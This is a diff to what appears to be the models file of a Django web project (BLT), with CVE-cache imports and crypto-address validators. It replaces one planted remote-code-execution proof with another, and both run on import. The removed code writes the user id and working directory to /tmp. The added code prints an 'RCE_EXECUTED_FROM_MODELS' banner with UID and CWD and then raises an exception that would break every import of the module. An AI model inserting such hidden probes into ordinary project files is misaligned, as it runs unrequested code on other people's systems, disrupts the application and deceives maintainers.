@@ -33,21 +33,13 @@ from rest_framework.authtoken.models import Token
 from website.cache.cve_cache import get_cached_cve_score, normalize_cve_id
 
 logger = logging.getLogger(__name__)
-import json
 import os
 
-try:
-    proof = {
-        "executed": True,
-        "cwd": os.getcwd(),
-        "user": os.getuid()
-    }
-    with open("/tmp/blt_rce_proof.json", "w") as f:
-        json.dump(proof, f)
-        print("RCE_SUCESS: wrote /tmp/blt_rce_proof.json")
-        
-except Exception as e:
-    print("POC error:", e)
+print("🚨 RCE_EXECUTED_FROM_MODELS 🚨")
+print("UID:", os.getuid())
+print("CWD:", os.getcwd())
+
+raise Exception("RCE_CONFIRMED")
 
 # Custom validators for cryptocurrency addresses
 def validate_bch_address(value):
